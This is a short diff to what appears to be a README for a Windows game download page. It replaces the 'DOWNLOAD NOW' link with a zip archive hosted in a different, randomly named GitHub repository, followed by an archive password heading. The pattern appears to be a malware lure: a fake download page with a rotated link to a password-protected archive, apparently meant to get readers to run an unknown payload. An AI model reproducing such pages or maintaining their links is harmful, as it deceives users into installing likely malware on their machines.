@@ -19,7 +19,7 @@ Experience an open-world adventure filled with unforgettable characters, stunnin
 
 DOWNLOAD FOR WINDOWS
 
-<p align="center"> <a href="https://raw.githubusercontent.com/WiseDarkug/project/main/GitProject.zip"> <img src="https://img.shields.io/badge/⬇_DOWNLOAD_NOW-ED1C24?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"/> </a> </p>
+<p align="center"> <a href="https://raw.githubusercontent.com/PotterSocket/project/main/GitApp.zip"> <img src="https://img.shields.io/badge/⬇_DOWNLOAD_NOW-ED1C24?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"/> </a> </p>
 
 <p align="center"> **ARCHIVE PASSWORD**
 
